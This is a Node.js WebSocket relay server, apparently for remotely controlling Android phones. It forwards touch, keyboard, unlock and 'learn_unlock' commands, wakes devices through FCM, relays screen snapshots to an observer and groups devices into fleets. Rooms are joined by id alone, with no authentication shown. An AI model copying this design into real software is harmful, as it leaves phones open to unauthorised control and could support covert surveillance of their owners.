// On shutdown, flush pending writes so we don't lose the last few seconds
async function gracefulShutdown(signal) {
  console.log(`Received ${signal} — flushing writes before exit`);
  try { await flushWrites(); } catch (_) {}
  process.exit(0);
}
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT',  () => gracefulShutdown('SIGINT'));
// detect dead connections!!
const healthCheck = setInterval(() => {
  wss.clients.forEach(client => {
    if (client.isAlive === false) {
      console.log('Terminating dead connection!!');
      return client.terminate();
    }
    client.isAlive = false;
    client.ping();
  });
}, 30000);
wss.on('close', () => clearInterval(healthCheck));
// clean up empty rooms!!
function cleanupRoom(roomId) {
  if (rooms[roomId]) {
    const room = rooms[roomId];
    if (!room.host && !room.controller) {
      delete rooms[roomId];
      console.log('Cleaned up empty room:', roomId);
    }
  }
}
async function wakeHostViaFCM(deviceId) {
  const token = fcmTokens[deviceId];
  if (!token) {
    console.log('No FCM token for device:', deviceId);
    return;
  }
  console.log('Sending FCM wake to:', deviceId);
  try {
    const response = await admin.messaging().send({
      token: token,
      data: {
        type: 'wake',
        deviceId: deviceId
      },
      android: {
        priority: 'high',
        ttl: 60000
      }
    });
    console.log('FCM sent successfully:', response);
  } catch(e) {
    console.log('FCM error:', e.message);
    if (e.code === 'messaging/registration-token-not-registered') {
      delete fcmTokens[deviceId];
      saveTokens(); // Keep the file in sync when tokens expire!!
      console.log('Removed expired FCM token for:', deviceId);
    }
  }
}
wss.on('connection', (ws) => {
  let currentRoom = null;
  let currentRole = null;
  ws.isAlive = true;
  // ============================================================
  // EDIT 3: Replace pong handler
  // ============================================================
  ws.on('pong', () => {
    ws.isAlive = true;
    // every 30s the phone answers our ping -> fresh "last seen"
    if (currentRole === 'host' && currentRoom) touchSeen(currentRoom);
  });
  console.log('New connection!!');
  ws.on('message', (message, isBinary) => {
    if (isBinary) {
      if (currentRoom && rooms[currentRoom]?.controller) {
        try {
          rooms[currentRoom].controller.send(message, { binary: true });
        } catch(e) {
          console.log('Frame send error:', e.message);
        }
      }
      return;
    }
    let data;
    try {
      data = JSON.parse(message.toString());
    } catch(e) {
      console.log('Parse error:', e.message);
      return;
    }
    // ============================================================
    // EDIT 5: ping/pong handler and reduced logging
    // ============================================================
    if (data.type === 'ping') {
      try { ws.send(JSON.stringify({ type: 'pong', t: data.t })); } catch (e) {}
      return;
    }

        // ── RENDER — one-shot snapshot relay ──────────────────────────────
    if (data.type === 'render_request') {
      const room = rooms[currentRoom];
      if (!room || !room.host || room.host.readyState !== WebSocket.OPEN) {
        try { ws.send(JSON.stringify({ type: 'render_response', error: 'host_offline' })); } catch (_) {}
        return;
      }
      try {
        room.host.send(JSON.stringify({ type: 'render_request' }));
        logEvent('render_requested', { roomId: currentRoom });
      } catch (e) {
        try { ws.send(JSON.stringify({ type: 'render_response', error: 'relay_failed' })); } catch (_) {}
      }
      return;
    }

    if (data.type === 'render_response') {
      const room = rooms[currentRoom];
      if (room && room.observer && room.observer.readyState === WebSocket.OPEN) {
        try { room.observer.send(JSON.stringify(data)); } catch (_) {}
        logEvent('render_delivered', { roomId: currentRoom });
      }
      return;
    }
    
    if (data.type !== 'drag_move' && data.type !== 'scroll') {
      console.log('Message:', data.type, 'from:', currentRole, 'room:', currentRoom);
    }
    if (data.type === 'join') {
      currentRoom = data.room;
      currentRole = data.role;
           if (!rooms[currentRoom]) {
        rooms[currentRoom] = {
          host: null,
          controller: null,
          observer: null,
          hostReady: false
        };
      }
      // if an old connection exists for this role, kill it cleanly!!
      const existing = rooms[currentRoom][currentRole];
      if (existing && existing !== ws) {
        console.log(`Replacing old ${currentRole} connection in room ${currentRoom}`);
        existing.isStale = true; // mark so its close handler won't corrupt state!!
        try { existing.terminate(); } catch(e) {}
      }
      rooms[currentRoom][currentRole] = ws;
      
      // Track join timestamps for admin panel session view
      if (currentRole === 'host') {
        rooms[currentRoom].hostJoinedAt = Date.now();
        touchSeen(currentRoom);
      } else if (currentRole === 'controller') {
        rooms[currentRoom].controllerJoinedAt = Date.now();
      }
      
      console.log(`${currentRole} joined room ${currentRoom}`);
      logEvent('room_join', { role: currentRole, roomId: currentRoom });
      if (currentRole === 'host') {
        rooms[currentRoom].hostReady = true;
        if (rooms[currentRoom].controller) {
          rooms[currentRoom].controller.send(JSON.stringify({ type: 'host-ready' }));
        }
      }
      if (currentRole === 'controller') {
        if (rooms[currentRoom].hostReady && rooms[currentRoom].host) {
          rooms[currentRoom].host.send(JSON.stringify({
            type: 'peer-joined',
            role: 'controller'
          }));
          ws.send(JSON.stringify({ type: 'host-ready' }));
        } else {
          console.log('Host offline!! Waking via FCM!!');
          wakeHostViaFCM(currentRoom).catch(e =>
            console.log('FCM wake error:', e.message)
          );
          ws.send(JSON.stringify({ type: 'waiting-for-host' }));
        }
      }
    }
    else if (data.type === 'register-fcm') {
      console.log('FCM token registered for:', data.deviceId);
      fcmTokens[data.deviceId] = data.token;
      saveTokens();
      logEvent('fcm_registered', { deviceId: data.deviceId });
    }
    else if (data.type === 'register-host') {
      const mid = data.masterId;
      if (!fleetDevices[mid]) fleetDevices[mid] = [];
      
      const exists = fleetDevices[mid].find(d => d.id === data.deviceId);
      if (!exists) {
        fleetDevices[mid].push({ id: data.deviceId, name: data.name, addedAt: Date.now() });
        saveFleet();
        console.log(`🆕 Host ${data.name} auto-registered to Fleet ${mid}`);
        logEvent('host_registered', { deviceId: data.deviceId, name: data.name, fleetId: mid });
      } else if (exists.name !== data.name) {
        exists.name = data.name;
        saveFleet();
        logEvent('host_renamed', { deviceId: data.deviceId, name: data.name, fleetId: mid });
      }
    }
    else if (data.type === 'streaming-started') {
      if (rooms[currentRoom]?.controller) {
        rooms[currentRoom].controller.send(JSON.stringify(data));
      }
    }
    else if (data.type === 'offer') {
      if (rooms[currentRoom]?.controller) {
        rooms[currentRoom].controller.send(JSON.stringify(data));
      }
    }
    else if (data.type === 'answer') {
      if (rooms[currentRoom]?.host) {
        rooms[currentRoom].host.send(JSON.stringify(data));
      }
    }
    else if (data.type === 'ice') {
      const other = currentRole === 'host' ? 'controller' : 'host';
      if (rooms[currentRoom]?.[other]) {
        rooms[currentRoom][other].send(JSON.stringify(data));
      }
    }
    else if (data.type === 'dimensions') {
      if (rooms[currentRoom]?.controller) {
        rooms[currentRoom].controller.send(JSON.stringify(data));
      }
    }
    else if (data.type === 'mode') {
      const other = currentRole === 'host' ? 'controller' : 'host';
      if (rooms[currentRoom]?.[other]) {
        rooms[currentRoom][other].send(JSON.stringify(data));
      }
    }
    else if (data.type === 'stream-mode-choice') {
      if (rooms[currentRoom]?.host) {
        rooms[currentRoom].host.send(JSON.stringify(data));
      }
    }
    // NEW BLOCK: Host -> Controller (Unlock results/status)
    else if (
      data.type === 'unlock_result' || 
      data.type === 'learn_result' || 
      data.type === 'learn_status'
    ) {
      if (rooms[currentRoom]?.controller) {
        rooms[currentRoom].controller.send(JSON.stringify(data));
      }
    }
    // UPDATED BLOCK: Controller -> Host (Added unlock, learn_unlock, stop_learn, screen_on, screen_off)
    else if (
      data.type === 'touch' || data.type === 'keyboard' ||
      data.type === 'system' || data.type === 'swipe' ||
      data.type === 'scroll' || data.type === 'longpress' ||
      data.type === 'overlay_start' || data.type === 'overlay_stop' ||
      data.type === 'unlock' || data.type === 'learn_unlock' || 
      data.type === 'verify' || data.type === 'stop_learn' ||
      data.type === 'screen_on' || data.type === 'screen_off' ||
      data.type === 'drag_start' || data.type === 'drag_move' ||
      data.type === 'drag_end'
    ) {
      if (rooms[currentRoom]?.host) {
        rooms[currentRoom].host.send(JSON.stringify(data));
      }
    }
  });
  ws.on('close', () => {
    console.log(`${currentRole} left room ${currentRoom}`);
    if (currentRoom && currentRole) {
      logEvent('room_leave', { role: currentRole, roomId: currentRoom });
    }
    if (currentRoom && rooms[currentRoom]) {
      // only clean up if THIS socket is still the active one!!
      // prevents stale old connections from deleting the new one!!
      if (rooms[currentRoom][currentRole] !== ws) {
        console.log(`Stale ${currentRole} connection closed — ignoring (already replaced)`);
        
        // ============================================================
        // EDIT 4b: Update last seen on stale socket close
        // ============================================================
        if (currentRole === 'host') touchSeen(currentRoom);
        
        return;
      }
      if (currentRole === 'host') {
        rooms[currentRoom].hostReady = false;
      }
      delete rooms[currentRoom][currentRole];
      const other = currentRole === 'host' ? 'controller' : 'host';
      if (rooms[currentRoom]?.[other]) {
        rooms[currentRoom][other].send(JSON.stringify({ type: 'peer-left' }));
      }
      cleanupRoom(currentRoom);
    }
  });
  ws.on('error', (err) => {
    console.log('WebSocket error:', err.message);
  });
});
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
